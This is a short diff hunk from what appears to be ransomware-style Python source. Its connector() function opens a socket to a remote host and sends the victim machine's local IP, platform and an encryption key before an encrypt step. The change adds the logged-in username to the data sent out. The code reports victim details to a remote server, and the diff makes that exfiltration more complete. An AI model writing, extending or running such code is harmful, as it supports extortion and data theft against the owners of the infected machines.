@@ -78,7 +78,7 @@ def connector():
     try:
         # Send Key
         server.connect((host, port))
-        msg = '%s$%s$%s' % (getlocalip(), platform, key)
+        msg = '%s$%s$%s$%s' % (getlocalip(), platform, key, getpass.getuser())
         server.send(msg.encode('utf-8'))
 
         <encrypt>
